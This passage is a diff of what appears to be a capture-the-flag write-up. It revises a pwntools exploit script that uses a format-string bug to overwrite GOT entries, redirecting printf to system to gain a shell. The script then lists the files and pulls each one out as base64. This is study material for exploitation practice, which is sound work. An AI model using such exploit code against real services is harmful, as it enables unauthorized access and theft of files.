@@ -109,22 +109,28 @@ So our final exploit looks like
 
 ``` 
 from pwn import *
-context.binary = ELF("./check")
+context.binary = ELF("path/to/binary")
 context.log_level = "debug"
 
+# got manually
 OFFSET = 6
 
+# from reversing pass()
 password = b"Lost_in_Light"
 
+# from ghidra
 system_plt = 0x401060
 init_addr = 0x401448
 putc_got = 0x404048
 printf_got = 0x404020
 
+# built in pwntools functions to overwrite GOT entries
 fmt1 = fmtstr_payload(offset=OFFSET, writes={putc_got: init_addr}, write_size="short")
 fmt2 = fmtstr_payload(offset=OFFSET, writes={printf_got: system_plt}, write_size="short")
 
-p = process("./check")
+p = process("path/to/binary")
+# For remote
+# p = remote(host,port)
 
 p.sendlineafter(b">>> ", password)
 p.sendlineafter(b">>> ", fmt1)
@@ -136,6 +142,7 @@ p.clean()
 
 p.sendline("ls")
 
+# receiving the files as base64 and decoding back to pdf to read the pdfs
 files = p.clean().decode().strip().split("\n")
 for file in files:
   p.sendline(f"base64 {file}".encode())
